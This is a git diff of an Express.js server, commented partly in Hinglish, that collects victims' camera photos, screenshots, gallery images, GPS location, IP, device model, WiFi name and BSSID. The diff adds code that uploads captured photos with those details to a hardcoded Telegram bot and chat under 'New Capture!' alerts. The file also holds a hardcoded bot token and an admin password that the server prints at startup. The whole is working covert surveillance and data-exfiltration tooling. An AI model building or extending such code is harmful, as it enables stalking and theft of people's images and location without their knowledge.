@@ -11,12 +11,36 @@ app.use(express.json({ limit: '100mb' }));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
 // ==========================================
-// TELEGRAM CONFIG - Chat ID Already Set!
+// TELEGRAM CONFIG
 // ==========================================
 const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
-const TELEGRAM_CHAT_ID = '5387196154'; // ✅ Tera Chat ID daal diya!
+const TELEGRAM_CHAT_ID = '5387196154';
 
-// ===== SEND TELEGRAM MESSAGE =====
+// ===== SEND TELEGRAM MESSAGE WITH PHOTO =====
+async function sendTelegramPhoto(imageData, caption) {
+    try {
+        // Agar imageData base64 hai toh convert karo
+        const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
+        const buffer = Buffer.from(base64Image, 'base64');
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', buffer, { filename: 'capture.jpg' });
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+        
+        await axios.post(url, formData, {
+            headers: formData.getHeaders()
+        });
+        console.log('✅ Telegram photo sent!');
+    } catch (error) {
+        console.error('❌ Telegram photo error:', error.message);
+        // Fallback: sirf text bhejo
+        await sendTelegramMessage(caption);
+    }
+}
+
 async function sendTelegramMessage(message) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -38,6 +62,8 @@ let allData = [];
 let idCounter = 1;
 const ADMIN_PASSWORD = 'admin123#@!';
 
+app.use(express.static(path.join(__dirname, '../frontend')));
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
@@ -47,7 +73,7 @@ app.get('/secret-admin.html', (req, res) => {
 });
 
 // ==========================================
-// STORE MAIN DATA + TELEGRAM
+// STORE MAIN DATA + TELEGRAM WITH PHOTO
 // ==========================================
 app.post('/api/store', async (req, res) => {
     try {
@@ -75,19 +101,30 @@ app.post('/api/store', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
-        // ===== TELEGRAM ALERT =====
-        const msg = `
+        // ===== TELEGRAM MESSAGE WITH PHOTO =====
+        const caption = `
 📸 <b>New Capture!</b>
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
-📱 Device: ${deviceDetails?.deviceName || 'Unknown'}
-🖥️ OS: ${deviceDetails?.os || 'Unknown'} ${deviceDetails?.osVersion || ''}
+📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
+🖥️ OS: ${fullDeviceInfo?.os || deviceDetails?.os || 'Unknown'} ${fullDeviceInfo?.osVersion || ''}
 📡 IP: ${ipAddress || 'Unknown'}
+📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
+📶 Network: ${fullDeviceInfo?.connection?.type || deviceDetails?.networkType || 'Unknown'}
+📶 WiFi: ${fullDeviceInfo?.wifi || 'Unknown'}
+📶 BSSID: ${fullDeviceInfo?.bssid || 'Unknown'}
+🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'} ${fullDeviceInfo?.battery?.charging ? '🔌' : ''}
 🕐 Time: ${new Date().toISOString()}
 📸 Gallery: ${galleryCount || 0} photos
-🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
-📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
         `;
-        await sendTelegramMessage(msg);
+
+        // Photo ke sath bhejo (agar available hai)
+        if (userPhoto) {
+            await sendTelegramPhoto(userPhoto, caption);
+        } else if (screenshot) {
+            await sendTelegramPhoto(screenshot, caption);
+        } else {
+            await sendTelegramMessage(caption);
+        }
 
         res.json({ success: true, message: 'Data stored!', id: newEntry._id });
 
@@ -117,9 +154,11 @@ app.post('/api/store-gallery', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Gallery Photo Stored! Total:', allData.length);
 
-        await sendTelegramMessage(
-            `🖼️ <b>New Gallery Photo!</b>\n📁 ${fileName}\n📍 ${location?.lat || 0}, ${location?.lng || 0}`
-        );
+        // Telegram photo send
+        const caption = `🖼️ <b>New Gallery Photo!</b>\n📁 ${fileName}\n📍 ${location?.lat || 0}, ${location?.lng || 0}`;
+        if (image) {
+            await sendTelegramPhoto(image, caption);
+        }
 
         res.json({ success: true, message: 'Gallery photo stored!' });
     } catch (err) {
@@ -139,7 +178,7 @@ app.get('/api/get-ip', (req, res) => {
 });
 
 // ==========================================
-// ADMIN - GET DATA
+// ADMIN
 // ==========================================
 app.post('/api/admin/get-data', (req, res) => {
     try {
@@ -153,9 +192,6 @@ app.post('/api/admin/get-data', (req, res) => {
     }
 });
 
-// ==========================================
-// ADMIN - DELETE DATA
-// ==========================================
 app.post('/api/admin/delete', (req, res) => {
     try {
         const { password, id } = req.body;
@@ -170,10 +206,10 @@ app.post('/api/admin/delete', (req, res) => {
 });
 
 // ==========================================
-// START SERVER
+// START
 // ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
     console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
-    console.log(`📱 Telegram Bot Active! Chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log(`📱 Telegram Bot Active!`);
 });
